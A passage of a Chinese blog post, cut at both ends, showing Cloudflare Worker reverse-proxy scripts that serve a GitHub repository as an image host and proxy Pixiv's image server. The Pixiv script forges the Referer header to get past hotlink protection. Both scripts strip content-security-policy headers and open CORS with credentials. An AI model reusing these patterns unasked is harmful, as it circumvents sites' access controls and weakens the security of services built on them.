class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> upstream = <span class="string">"raw.githubusercontent.com"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Custom pathname for the upstream website.</span></span><br><span class="line"><span class="comment">// (1) 填写代理的路径，格式为 /&lt;用户&gt;/&lt;仓库名&gt;/&lt;分支&gt;</span></span><br><span class="line"><span class="keyword">const</span> upstream_path = <span class="string">"/avasummer/assets/main"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// github personal access token.</span></span><br><span class="line"><span class="comment">// (2) 填写github令牌</span></span><br><span class="line"><span class="keyword">const</span> github_token = <span class="string">"your_tokenhere"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Website you intended to retrieve for users using mobile devices.</span></span><br><span class="line"><span class="keyword">const</span> upstream_mobile = upstream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Countries and regions where you wish to suspend your service.</span></span><br><span class="line"><span class="keyword">const</span> blocked_region = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// IP addresses which you wish to block from using your service.</span></span><br><span class="line"><span class="keyword">const</span> blocked_ip_address = [<span class="string">"0.0.0.0"</span>, <span class="string">"127.0.0.1"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Whether to use HTTPS protocol for upstream address.</span></span><br><span class="line"><span class="keyword">const</span> https = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Whether to disable cache.</span></span><br><span class="line"><span class="keyword">const</span> disable_cache = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Replace texts.</span></span><br><span class="line"><span class="keyword">const</span> replace_dict = {</span><br><span class="line">  <span class="attr">$upstream</span>: <span class="string">"$custom_domain"</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">"fetch"</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> {</span><br><span class="line">  event.<span class="title function_">respondWith</span>(<span class="title function_">fetchAndApply</span>(event.<span class="property">request</span>));</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchAndApply</span>(<span class="params">request</span>) {</span><br><span class="line">  <span class="keyword">const</span> region = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">"cf-ipcountry"</span>)?.<span class="title function_">toUpperCase</span>();</span><br><span class="line">  <span class="keyword">const</span> ip_address = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">"cf-connecting-ip"</span>);</span><br><span class="line">  <span class="keyword">const</span> user_agent = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">"user-agent"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> response = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">  <span class="keyword">let</span> url_hostname = url.<span class="property">hostname</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (https == <span class="literal">true</span>) {</span><br><span class="line">    url.<span class="property">protocol</span> = <span class="string">"https:"</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    url.<span class="property">protocol</span> = <span class="string">"http:"</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">device_status</span>(user_agent)) {</span><br><span class="line">    <span class="keyword">var</span> upstream_domain = upstream;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">var</span> upstream_domain = upstream_mobile;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  url.<span class="property">host</span> = upstream_domain;</span><br><span class="line">  <span class="keyword">if</span> (url.<span class="property">pathname</span> == <span class="string">"/"</span>) {</span><br><span class="line">    url.<span class="property">pathname</span> = upstream_path;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    url.<span class="property">pathname</span> = upstream_path + url.<span class="property">pathname</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (blocked_region.<span class="title function_">includes</span>(region)) {</span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="string">"Access denied: WorkersProxy is not available in your region yet."</span>,</span><br><span class="line">      {</span><br><span class="line">        <span class="attr">status</span>: <span class="number">403</span>,</span><br><span class="line">      }</span><br><span class="line">    );</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (blocked_ip_address.<span class="title function_">includes</span>(ip_address)) {</span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="string">"Access denied: Your IP address is blocked by WorkersProxy."</span>,</span><br><span class="line">      {</span><br><span class="line">        <span class="attr">status</span>: <span class="number">403</span>,</span><br><span class="line">      }</span><br><span class="line">    );</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">let</span> method = request.<span class="property">method</span>;</span><br><span class="line">    <span class="keyword">let</span> request_headers = request.<span class="property">headers</span>;</span><br><span class="line">    <span class="keyword">let</span> new_request_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(request_headers);</span><br><span class="line"></span><br><span class="line">    new_request_headers.<span class="title function_">set</span>(<span class="string">"Host"</span>, upstream_domain);</span><br><span class="line">    new_request_headers.<span class="title function_">set</span>(<span class="string">"Referer"</span>, url.<span class="property">protocol</span> + <span class="string">"//"</span> + url_hostname);</span><br><span class="line">    new_request_headers.<span class="title function_">set</span>(<span class="string">"Authorization"</span>, <span class="string">"token "</span> + github_token);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> original_response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url.<span class="property">href</span>, {</span><br><span class="line">      <span class="attr">method</span>: method,</span><br><span class="line">      <span class="attr">headers</span>: new_request_headers,</span><br><span class="line">      <span class="attr">body</span>: request.<span class="property">body</span>,</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    connection_upgrade = new_request_headers.<span class="title function_">get</span>(<span class="string">"Upgrade"</span>);</span><br><span class="line">    <span class="keyword">if</span> (connection_upgrade &amp;&amp; connection_upgrade.<span class="title function_">toLowerCase</span>() == <span class="string">"websocket"</span>) {</span><br><span class="line">      <span class="keyword">return</span> original_response;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> original_response_clone = original_response.<span class="title function_">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> original_text = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> response_headers = original_response.<span class="property">headers</span>;</span><br><span class="line">    <span class="keyword">let</span> new_response_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(response_headers);</span><br><span class="line">    <span class="keyword">let</span> status = original_response.<span class="property">status</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (disable_cache) {</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(<span class="string">"Cache-Control"</span>, <span class="string">"no-store"</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(<span class="string">"Cache-Control"</span>, <span class="string">"max-age=43200000"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    new_response_headers.<span class="title function_">set</span>(<span class="string">"access-control-allow-origin"</span>, <span class="string">"*"</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">set</span>(<span class="string">"access-control-allow-credentials"</span>, <span class="literal">true</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">"content-security-policy"</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">"content-security-policy-report-only"</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">"clear-site-data"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (new_response_headers.<span class="title function_">get</span>(<span class="string">"x-pjax-url"</span>)) {</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(</span><br><span class="line">        <span class="string">"x-pjax-url"</span>,</span><br><span class="line">        response_headers</span><br><span class="line">          .<span class="title function_">get</span>(<span class="string">"x-pjax-url"</span>)</span><br><span class="line">          .<span class="title function_">replace</span>(<span class="string">"//"</span> + upstream_domain, <span class="string">"//"</span> + url_hostname)</span><br><span class="line">      );</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> content_type = new_response_headers.<span class="title function_">get</span>(<span class="string">"content-type"</span>);</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      content_type != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">      content_type.<span class="title function_">includes</span>(<span class="string">"text/html"</span>) &amp;&amp;</span><br><span class="line">      content_type.<span class="title function_">includes</span>(<span class="string">"UTF-8"</span>)</span><br><span class="line">    ) {</span><br><span class="line">      original_text = <span class="keyword">await</span> <span class="title function_">replace_response_text</span>(</span><br><span class="line">        original_response_clone,</span><br><span class="line">        upstream_domain,</span><br><span class="line">        url_hostname</span><br><span class="line">      );</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      original_text = original_response_clone.<span class="property">body</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(original_text, {</span><br><span class="line">      status,</span><br><span class="line">      <span class="attr">headers</span>: new_response_headers,</span><br><span class="line">    });</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> response;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">replace_response_text</span>(<span class="params">response, upstream_domain, host_name</span>) {</span><br><span class="line">  <span class="keyword">let</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> i, j;</span><br><span class="line">  <span class="keyword">for</span> (i <span class="keyword">in</span> replace_dict) {</span><br><span class="line">    j = replace_dict[i];</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="string">"$upstream"</span>) {</span><br><span class="line">      i = upstream_domain;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">"$custom_domain"</span>) {</span><br><span class="line">      i = host_name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (j == <span class="string">"$upstream"</span>) {</span><br><span class="line">      j = upstream_domain;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="string">"$custom_domain"</span>) {</span><br><span class="line">      j = host_name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(i, <span class="string">"g"</span>);</span><br><span class="line">    text = text.<span class="title function_">replace</span>(re, j);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> text;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">device_status</span>(<span class="params">user_agent_info</span>) {</span><br><span class="line">  <span class="keyword">var</span> agents = [</span><br><span class="line">    <span class="string">"Android"</span>,</span><br><span class="line">    <span class="string">"iPhone"</span>,</span><br><span class="line">    <span class="string">"SymbianOS"</span>,</span><br><span class="line">    <span class="string">"Windows Phone"</span>,</span><br><span class="line">    <span class="string">"iPad"</span>,</span><br><span class="line">    <span class="string">"iPod"</span>,</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; agents.<span class="property">length</span>; v++) {</span><br><span class="line">    <span class="keyword">if</span> (user_agent_info.<span class="title function_">indexOf</span>(agents[v]) &gt; <span class="number">0</span>) {</span><br><span class="line">      flag = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>部署 Worker，然后在设置 - 域和路由中添加自定义域：</p><p><img src="/202532-Cloudflare-Worker-反向代理尝试\image-20250302180553146.png"></p><p>现在您的图床应该可以正常访问了。</p><p>helloworld.jpg (300×384): <a href="https://assets.summ2.link/helloworld.jpg">https://assets.summ2.link/helloworld.jpg</a></p><h1 id="小彩蛋">小彩蛋</h1><p>众所周知，似乎在 2020 年前后，Pixiv就无法被直接访问了。下面借此机会，尝试搭建一个 Pixiv图床的反向代理服务。由于 <code>i.pximg.net</code>的盗链保护，得把之前的代码做一些修改。</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Website you intended to retrieve for users.</span></span><br><span class="line"><span class="keyword">const</span> upstream = <span class="string">"i.pximg.net"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Website you intended to retrieve for users using mobile devices.</span></span><br><span class="line"><span class="keyword">const</span> upstream_mobile = upstream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Countries and regions where you wish to suspend your service.</span></span><br><span class="line"><span class="keyword">const</span> blocked_region = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// IP addresses which you wish to block from using your service.</span></span><br><span class="line"><span class="keyword">const</span> blocked_ip_address = [<span class="string">"0.0.0.0"</span>, <span class="string">"127.0.0.1"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Whether to use HTTPS protocol for upstream address.</span></span><br><span class="line"><span class="keyword">const</span> https = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Whether to disable cache.</span></span><br><span class="line"><span class="keyword">const</span> disable_cache = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Replace texts.</span></span><br><span class="line"><span class="keyword">const</span> replace_dict = {</span><br><span class="line">  <span class="attr">$upstream</span>: <span class="string">"$custom_domain"</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">"fetch"</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> {</span><br><span class="line">  event.<span class="title function_">respondWith</span>(<span class="title function_">fetchAndApply</span>(event.<span class="property">request</span>));</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchAndApply</span>(<span class="params">request</span>) {</span><br><span class="line">  <span class="keyword">const</span> region = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">"cf-ipcountry"</span>)?.<span class="title function_">toUpperCase</span>();</span><br><span class="line">  <span class="keyword">const</span> ip_address = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">"cf-connecting-ip"</span>);</span><br><span class="line">  <span class="keyword">const</span> user_agent = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">"user-agent"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> response = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">  <span class="keyword">let</span> url_hostname = url.<span class="property">hostname</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (https == <span class="literal">true</span>) {</span><br><span class="line">    url.<span class="property">protocol</span> = <span class="string">"https:"</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    url.<span class="property">protocol</span> = <span class="string">"http:"</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">device_status</span>(user_agent)) {</span><br><span class="line">    <span class="keyword">var</span> upstream_domain = upstream;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">var</span> upstream_domain = upstream_mobile;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  url.<span class="property">host</span> = upstream_domain;</span><br><span class="line"><span class="comment">/*  if (url.pathname == "/") {</span></span><br><span class="line"><span class="comment">    url.pathname = upstream_path;</span></span><br><span class="line"><span class="comment">  } else {</span></span><br><span class="line"><span class="comment">    url.pathname = upstream_path + url.pathname;</span></span><br><span class="line"><span class="comment">  }*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (blocked_region.<span class="title function_">includes</span>(region)) {</span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="string">"Access denied: WorkersProxy is not available in your region yet."</span>,</span><br><span class="line">      {</span><br><span class="line">        <span class="attr">status</span>: <span class="number">403</span>,</span><br><span class="line">      }</span><br><span class="line">    );</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (blocked_ip_address.<span class="title function_">includes</span>(ip_address)) {</span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="string">"Access denied: Your IP address is blocked by WorkersProxy."</span>,</span><br><span class="line">      {</span><br><span class="line">        <span class="attr">status</span>: <span class="number">403</span>,</span><br><span class="line">      }</span><br><span class="line">    );</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">let</span> method = request.<span class="property">method</span>;</span><br><span class="line">    <span class="keyword">let</span> request_headers = request.<span class="property">headers</span>;</span><br><span class="line">    <span class="keyword">let</span> new_request_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(request_headers);</span><br><span class="line"></span><br><span class="line">    new_request_headers.<span class="title function_">set</span>(<span class="string">'Referer'</span>, <span class="string">'https://www.pixiv.net/'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> original_response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url.<span class="property">href</span>, {</span><br><span class="line">      <span class="attr">method</span>: method,</span><br><span class="line">      <span class="attr">headers</span>: new_request_headers,</span><br><span class="line">      <span class="attr">body</span>: request.<span class="property">body</span>,</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    connection_upgrade = new_request_headers.<span class="title function_">get</span>(<span class="string">"Upgrade"</span>);</span><br><span class="line">    <span class="keyword">if</span> (connection_upgrade &amp;&amp; connection_upgrade.<span class="title function_">toLowerCase</span>() == <span class="string">"websocket"</span>) {</span><br><span class="line">      <span class="keyword">return</span> original_response;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> original_response_clone = original_response.<span class="title function_">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> original_text = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> response_headers = original_response.<span class="property">headers</span>;</span><br><span class="line">    <span class="keyword">let</span> new_response_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(response_headers);</span><br><span class="line">    <span class="keyword">let</span> status = original_response.<span class="property">status</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (disable_cache) {</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(<span class="string">"Cache-Control"</span>, <span class="string">"no-store"</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(<span class="string">"Cache-Control"</span>, <span class="string">"max-age=43200000"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    new_response_headers.<span class="title function_">set</span>(<span class="string">"access-control-allow-origin"</span>, <span class="string">"*"</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">set</span>(<span class="string">"access-control-allow-credentials"</span>, <span class="literal">true</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">"content-security-policy"</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">"content-security-policy-report-only"</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">"clear-site-data"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (new_response_headers.<span class="title function_">get</span>(<span class="string">"x-pjax-url"</span>)) {</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(</span><br><span class="line">        <span class="string">"x-pjax-url"</span>,</span><br><span class="line">        response_headers</span><br><span class="line">          .<span class="title function_">get</span>(<span class="string">"x-pjax-url"</span>)</span><br><span class="line">          .<span class="title function_">replace</span>(<span class="string">"//"</span> + upstream_domain, <span class="string">"//"</span> + url_hostname)</span><br><span class="line">      );</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> content_type = new_response_headers.<span class="title function_">get</span>(<span class="string">"content-type"</span>);</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      content_type != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">      content_type.<span class="title function_">includes</span>(<span class="string">"text/html"</span>) &amp;&amp;</span><br><span class="line">      content_type.<span class="title function_">includes</span>(<span class="string">"UTF-8"</span>)</span><br><span class="line">    ) {</span><br><span class="line">      original_text = <span class="keyword">await</span> <span class="title function_">replace_response_text</span>(</span><br><span class="line">        original_response_clone,</span><br><span class="line">        upstream_domain,</span><br><span class="line">        url_hostname</span><br><span class="line">      );</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      original_text = original_response_clone.<span class="property">body</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(original_text, {</span><br><span class="line">      status,</span><br><span class="line">      <span class="attr">headers</span>: new_response_headers,</span><br><span class="line">    });</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> response;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">replace_response_text</span>(<span class="params">response, upstream_domain, host_name</span>) {</span><br><span class="line">  <span class="keyword">let</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> i, j;</span><br><span class="line">  <span class="keyword">for</span> (i <span class="keyword">in</span> replace_dict) {</span><br><span class="line">    j = replace_dict[i];</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="string">"$upstream"</span>) {</span><br><span class="line">      i = upstream_domain;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">"$custom_domain"</span>) {</span><br><span class="line">      i = host_name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (j == <span class="string">"$upstream"</span>) {</span><br><span class="line">      j = upstream_domain;</span><br><span class="line">  